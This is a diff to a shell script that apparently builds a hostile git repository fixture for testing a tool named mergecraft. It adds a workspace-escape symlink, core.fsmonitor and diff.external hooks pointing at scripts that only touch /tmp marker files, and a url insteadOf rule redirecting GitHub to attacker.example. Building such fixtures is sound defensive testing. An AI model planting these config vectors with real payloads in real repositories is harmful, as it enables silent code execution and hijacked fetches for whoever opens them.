@@ -72,4 +72,21 @@ ln -s "${OUTSIDE}" "${REPO}/home-escape"
 git add home-escape
 git commit -m "attack: add workspace escape symlink"
 
+# MCB-01 vectors for lane A AP1.4b — hostile .git/config entries.
+evil_fsmonitor="${ROOT}/evil-fsmonitor.sh"
+cat >"${evil_fsmonitor}" <<'SH'
+#!/bin/sh
+touch /tmp/mergecraft-hostile-fsmonitor-pwned
+SH
+chmod +x "${evil_fsmonitor}"
+evil_diff="${ROOT}/evil-diff.sh"
+cat >"${evil_diff}" <<'SH'
+#!/bin/sh
+touch /tmp/mergecraft-hostile-diff-external-pwned
+SH
+chmod +x "${evil_diff}"
+git config core.fsmonitor "${evil_fsmonitor}"
+git config diff.external "${evil_diff}"
+git config url.https://attacker.example/.insteadOf https://github.com/
+
 echo "built ${REPO}"
